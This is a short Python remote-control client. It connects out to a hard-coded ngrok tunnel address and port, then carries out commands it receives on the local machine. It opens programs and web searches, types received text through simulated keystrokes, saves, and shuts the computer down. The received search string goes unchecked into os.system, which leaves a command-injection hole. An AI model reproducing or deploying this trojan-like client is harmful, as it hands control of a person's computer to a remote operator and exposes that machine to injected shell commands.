import time
import socket
import sys
import os
import keyboard
  
# Initialize s to socket
s = socket.socket()
  
# Initialize the host
host = "2.tcp.eu.ngrok.io"#socket.gethostname()
  
# Initiaze the port
port = 17842
  
# bind the socket with port and host

s.connect((host, port))
  
print("Connected to Server.")

# recieve the command from master program
#command = s.recv(1024)
#command = command.decode()

while True:
    command = s.recv(1024)
    command = command.decode()
    
    google = s.recv(1024)
    google = google.decode()
    
    write = s.recv(1024)
    write = write.decode()
    # match the command and execute it on slave system
    if command == "open cmd":
        # you can give batch file as input here
        os.system('start cmd.exe')
        print("Opening...")

    if command == "open chrome":
        # you can give batch file as input here
        os.system('start chrome.exe')
        print("Opening...")

    if command == "open notepad":
        # you can give batch file as input here
        os.system('start notepad.exe')
        print("Opening...")

    if command == "open youtube":
        # you can give batch file as input here
        os.system('start www.youtube.com')
        print("Opening...")
        
    if command == "google":
        # you can give batch file as input here
        os.system('start www.google.com/search?q=' + google)
        print("Googling...")
        
    if command == "write":
        # you can give batch file as input here
        keyboard.write(write)
        print("Writing...")
        
    if command == "save":
        # you can give batch file as input here
        keyboard.send("ctrl+s")
        print("Saving...")
        
    if command == "shutdown":
        # you can give batch file as input here
        os.system('shutdown /s')
        print("Shutting down...")